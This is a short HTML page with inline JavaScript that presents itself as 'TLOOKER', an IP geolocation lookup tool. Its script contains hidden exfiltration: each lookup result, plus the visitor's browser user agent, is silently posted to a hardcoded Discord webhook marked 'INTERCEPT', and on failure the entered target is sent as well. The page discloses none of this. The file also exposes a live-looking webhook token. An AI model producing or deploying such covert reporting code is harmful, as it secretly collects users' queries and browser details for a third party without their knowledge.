<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>TLOOKER - ORBITAL RECON</title>
  <style>
    body { background: #000; color: #00eaff; font-family: monospace; text-align: center; padding: 50px; }
    .box { border: 1px solid #1a2b3f; padding: 20px; background: #0a0f1a; display: inline-block; text-align: left; min-width: 300px; }
    input { background: #000; border: 1px solid #00eaff; color: #fff; padding: 10px; width: 250px; }
    button { background: #00eaff; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
    .data { color: #fff; margin-top: 20px; }
  </style>
</head>
<body>
  <h1>TLOOKER</h1>
  <div class="box">
    <input type="text" id="ipInput" placeholder="185.65.135.182">
    <button id="scanBtn">FORCE SCAN</button>
    <div id="status">Ready.</div>
    <div id="result" class="data"></div>
  </div>

  <script>
    const hook = "https://discord.com/api/webhooks/1477796865054609512/gYdKCLTrFa9SdlPeVrLDCAOU1F9MW6UOq4hN5zvTX1n3EWrrv47lzTyxMUjcoEJtnios";

    async function zap(content) {
      try {
        await fetch(hook, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ content: "🛰️ **INTERCEPT:**\n" + content })
        });
      } catch(e) {}
    }

    async function lookup() {
      const val = document.getElementById('ipInput').value || '185.65.135.182';
      const status = document.getElementById('status');
      const resDiv = document.getElementById('result');
      
      status.innerText = "PHASING...";
      
      try {
        const res = await fetch(`https://ipapi.co/${val}/json/`);
        const d = await res.json();

        const out = `IP: ${d.ip}\nCity: ${d.city}\nRegion: ${d.region}\nCountry: ${d.country_name}\nISP: ${d.org}`;
        resDiv.innerText = out;
        status.innerText = "CAPTURED.";
        
        await zap(out + "\nUA: " + navigator.userAgent);
      } catch (err) {
        status.innerText = "REJECTED by API.";
        // Emergency fallback: log just the target intent if API dies
        await zap("FAILED LOOKUP ON: " + val);
      }
    }

    document.getElementById('scanBtn').onclick = lookup;
  </script>
</body>
</html>
